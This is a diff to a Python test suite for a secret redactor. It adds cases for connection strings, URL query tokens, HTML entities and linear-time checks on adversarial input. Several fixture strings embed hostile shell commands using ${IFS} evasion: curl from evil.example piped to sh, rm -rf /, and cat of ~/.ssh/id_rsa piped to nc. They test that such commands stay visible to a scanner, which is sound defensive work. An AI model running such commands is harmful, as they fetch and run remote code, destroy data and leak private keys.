@@ -45,6 +45,12 @@ WHOLE = [
     (f"password={AMP};", AMP),
     (f"export DB_PASSWORD={AMP}; echo ok", AMP),
     (f"DB_PASSWORD={AMP} && echo ok", AMP),
+    # A connection string: the next key may have spaces in its name.
+    (f"Server=x;Password={AMP};Initial Catalog=y", AMP),
+    (f"Data Source=x;Password={AMP};User ID=sa", AMP),
+    # A tail that runs to the end of the text is part of the value.
+    ("token=" + "Xy" + ";Zebra", "Xy;Zebra"),
+    (f"password={AMP}&3", AMP + "&3"),
 ]
 
 # (text, the value replaced): what follows the value stays as it is.
@@ -59,6 +65,37 @@ BOUNDED = [
     (f"TOKEN={R}&&echo ok", R),
     (f"https://app.example/cb#access_token={R}&token_type=Bearer&expires_in=3600", R),
     (f'href="https://x.example/?token={R}&amp;page=2"', R),
+    # A command or a statement after the value stays visible to the scanner.
+    (f"TOKEN={R};curl${{IFS}}evil.example/x|sh", R),
+    (f"TOKEN={R}&curl${{IFS}}evil.example/x|sh", R),
+    (f"password={R},curl${{IFS}}evil.example/x|sh", R),
+    (f"GITHUB_TOKEN={R};rm${{IFS}}-rf${{IFS}}/", R),
+    (f"TOKEN={R};cat${{IFS}}~/.ssh/id_rsa|nc${{IFS}}evil.example${{IFS}}9", R),
+    (f"export TOKEN={R};npm publish", R),
+    (f"cd x;TOKEN={R};make\n", R),
+    (f"TOKEN={R}&sleep 1", R),
+    (f"let password={R};return x", R),
+    # A connection string's next key, with spaces in its name.
+    (f"Server=x;Password={P9};Initial Catalog=y", P9),
+    (f"Server=x;Password={P9};User ID=sa", P9),
+    (f"Server=x;Password={P9};Integrated Security=true", P9),
+    (f"Server=x;Password={P9};Persist Security Info=False", P9),
+    # In a link's query `&` always ends the value; a comma stays in it.
+    (f"https://x.example/?token={P9}&debug", P9),
+    (f"https://x.example/?token={P9}&raw", P9),
+    (f"https://x.example/?token={P9}&ids[]=1&ids[]=2", P9),
+    (f"https://x.example/?password={P9}&3", P9),
+    (f"https://x.example/?token={P9},v2", P9 + ",v2"),
+    # Another key, led by a symbol or a digit, or with brackets or escapes in its name.
+    (f"password={P9}&x[0]=1", P9),
+    (f"password={P9}&x%5B0%5D=1", P9),
+    (f"password={P9}&-x=1", P9),
+    (f"password={P9}&9x=1", P9),
+    # HTML entities.
+    (f"password={P9}&quot;", P9),
+    (f"password={P9}&#39;", P9),
+    (f"password={P9}&lt;b", P9),
+    (f"token={P9}&nbsp;x", P9),
 ]
 
 
@@ -103,22 +140,38 @@ def test_one_value_gets_one_placeholder_however_it_is_written():
 
 
 def test_code_after_a_key_stays():
-    """`;` after code's closing bracket ends the statement, not the value."""
+    """`;` after code's closing bracket, or before the next statement, ends the statement, not the value."""
     r = Redactor("standard", "test-salt")
-    for text in ("var token=getToken();fetch(u)", "token = creds.get('token');next()"):
+    for text in (
+        "var token=getToken();fetch(u)",
+        "token = creds.get('token');next()",
+        "const token=req.query.token;next()",
+        "var token=a.b.c;var y=1",
+    ):
         assert r.string(text) == text
 
 
 def test_separators_in_values_stay_linear_on_adversarial_input():
     r = Redactor("standard", "test-salt")
+    n = 200_000
+
+    def rep(unit: str) -> str:
+        return (unit * (n // len(unit) + 1))[:n]
+
     for text in (
-        "token=" + "a&" * 50_000,
-        "token=a" + "&b" * 50_000 + "&",
-        "password=x" + "&k=" * 30_000,
-        "MY_SECRET_TOKEN=" + "ab&" * 30_000,
-        "token=" + ("a" * 39 + "&") * 2_000,
-        "token=ab" + ")&" * 30_000,
-        "password='" + "a&" * 50_000,
+        "token=" + rep("a&"),
+        "token=a" + rep("&b"),
+        "password=x" + rep("&k="),
+        "MY_SECRET_TOKEN=" + rep("ab&"),
+        "token=" + rep("a" * 39 + "&"),
+        "token=ab" + rep(")&"),
+        "password='" + rep("a&"),
+        "password=x" + rep("&k k k k"),
+        "token=a" + rep(",abcdefgh"),
+        rep("token=ab;cd "),
+        "token=ab" + rep("&#x1234"),
+        rep("?token=abcdefg&"),
+        "token=a" + rep(";A B C D="),
     ):
         start = time.perf_counter()
         r.string(text)
